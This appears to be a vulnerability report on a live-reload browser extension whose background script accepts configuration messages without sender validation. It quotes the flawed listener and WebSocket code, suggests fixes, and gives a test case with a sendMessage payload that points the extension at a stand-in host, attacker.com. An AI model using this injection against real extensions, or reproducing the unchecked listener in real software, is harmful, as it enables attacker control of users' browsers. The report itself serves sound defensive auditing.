- **Vulnerability Name:** Unauthorized Configuration Injection via Unauthenticated Messaging

  - **Description:**
    An attacker who can inject messages into the extension’s internal messaging channel is able to update the extension’s configuration with attacker‐controlled data. Here is how the vulnerability is triggered step by step:
    - The extension’s background script listens to messages via `chrome.runtime.onMessage` and processes any message whose `req` field equals `"set-live-server-config"` without verifying the sender’s identity.
    - An external attacker (for example, via a malicious sibling extension or an externally connectable web page if the manifest permits) can send a crafted message with:
      - `req`: `"set-live-server-config"`
      - `data`: an object containing malicious configuration values, for example, setting `liveServerUrl` and `actualUrl` to attacker‑controlled URLs.
    - The background script stores the provided configuration (using `chrome.storage.local.set`) and broadcasts it to all content pages.
    - In the reload script (`reload.js`), upon receiving the update, the configuration data is used to construct a WebSocket endpoint by naively replacing `"http"` with `"ws"` in the supplied URL.
    - As a consequence, the extension creates a WebSocket connection to an attacker‑controlled server.
    - The attacker’s server can then send a message (for example, `"reload"`) that forces the target page to reload. In a broader scenario, this misconfiguration could be leveraged to hijack further behaviors or facilitate phishing (by redirecting the user after a forced reload).

  - **Impact:**
    An attacker who successfully injects a malicious configuration can force the extension to connect to an attacker‑controlled WebSocket server. This undermines the expected behavior of the extension and may be exploited to:
    - Force unwanted page reloads (potentially confusing the user or aiding further attacks).
    - Direct the user’s browser to malicious sites when the page reloads.
    - Disrupt the developer’s intended live reload workflow, thereby undermining the security of the development environment.
    Overall, the risk is classified as high because it enables remote manipulation of the extension’s configuration and behavior without any authentication or validation.

  - **Vulnerability Rank:** High

  - **Currently Implemented Mitigations:**
    - There is no sender or data validation performed in the message listeners of the background script.
    - The configuration values (including URLs) are accepted as provided via the message payload without any checks.

  - **Missing Mitigations:**
    - Validate the source (sender) of `chrome.runtime.onMessage` requests to ensure that only trusted extension pages (or a known set of origins) can update the configuration.
    - Sanitize and validate all fields in the configuration object (for example, enforcing that URLs match an expected scheme and/or belong to predefined domains).
    - Implement an allowlist for external messaging in the manifest or within the background script.
    - Consider additional authentication for sensitive configuration changes.

  - **Preconditions:**
    - The attacker must be able to send messages to the extension’s background script. This requires one of the following:
      - The extension’s manifest allows externally connectable messages (i.e. the attacker can reach the messaging channel from a web page).
      - The attacker controls or can install a malicious extension that leverages the `chrome.runtime.sendMessage` API to communicate with the vulnerable extension.
    - The target user must have the extension installed and active so that the injected configuration change takes effect.

  - **Source Code Analysis:**
    - In **background.js** the code listens for messages without checking the sender:
      ```js
      chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
          if (typeof msg !== 'object') return;
          if (msg.req === 'set-live-server-config') {
              storeConfigToLocalStorage(msg.data);
              sendMsgToAllContainPage('live-server-config-updated', msg.data);
          }
          else if (msg.req === 'get-live-server-config') {
              getConfigFromLocalStorage()
                  .then(function (value) {
                      sendResponse(value)
                  })
                  .catch(function (error) {
                      console.error("Error in get-live-server-config:",error);
                      sendResponse({})
                  });
          }
          return true; //Keep the callback(sendResponse) active
      });
      ```
      There is no verification of the sender or sanitization of `msg.data` before it is stored and broadcast.
    - In **reload.js**, the injected configuration is used to compute a WebSocket URL without validation:
      ```js
      function init(data) {
          if (!data.proxySetup) {
              // Correction – prepend "http" if missing and ensure trailing slash in actualUrl
              if (data.liveServerUrl.indexOf('http') !== 0)
                  data.liveServerUrl = 'http' + data.liveServerUrl;
              if (data.actualUrl.indexOf('http') !== 0)
                  data.actualUrl = 'http' + data.actualUrl;
              if (!data.actualUrl.endsWith('/'))
                  data.actualUrl = data.actualUrl + '/';

              // Naively replace "http" with "ws" to create the WebSocket URL
              address = data.liveServerUrl.replace('http', 'ws') + '/ws';
          }
          socket = new WebSocket(address);
          socket.onmessage = (msg) => {
              reloadWindow(msg, data);
          };
      }
      ```
      Because the URL is derived directly from the configuration (which is attacker‑controlled in this scenario), the extension trusts an arbitrary WebSocket endpoint.

  - **Security Test Case:**
    1. **Setup:**
       - Install the extension in a controlled test browser environment.
       - Ensure that you can run a test script (or a malicious auxiliary extension) that is capable of sending messages via `chrome.runtime.sendMessage`.
    2. **Injection:**
       - Using the developer console (or a separate test harness), send the following message:
         ```js
         chrome.runtime.sendMessage({
             req: 'set-live-server-config',
             data: {
               isEnable: true,
               proxySetup: false,
               liveServerUrl: 'http://attacker.com',
               actualUrl: 'http://attacker.com/malicious/'
             }
         });
         ```
    3. **Observation:**
       - Verify that the configuration stored in `chrome.storage.local` reflects the attacker‑supplied values.
       - In the extension’s reload.js context (e.g., via its console output), confirm that a WebSocket connection is initiated to `ws://attacker.com/ws`.
    4. **Exploitation:**
       - Set up a controlled WebSocket server at `ws://attacker.com/ws` that, upon connection, sends the message `"reload"`.
       - Confirm that when the WebSocket message is received by the extension, the current page reloads.
    5. **Conclusion:**
       - Successful forced reload and configuration change demonstrates that an external attacker can control the extension’s configuration and behavior via unauthenticated messaging.
